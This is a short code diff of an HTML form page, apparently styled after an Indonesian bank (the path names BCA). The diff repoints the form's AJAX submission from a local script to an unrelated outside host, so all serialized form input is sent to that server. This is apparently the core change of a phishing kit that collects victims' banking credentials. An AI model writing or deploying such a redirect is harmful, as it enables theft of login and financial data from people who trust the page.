@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html lang="en" >
 <head>
  <meta name="theme-color" content="#005BAA"> 
@@ -297,7 +296,7 @@ document.getElementById('btnSubmit').innerHTML = "Memproses...";
 
  $.ajax({
  type: 'POST',
- url: 'sendData.php',
+ url: 'https://kementrian-daerah.c1.is/database/BCA/sendData.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
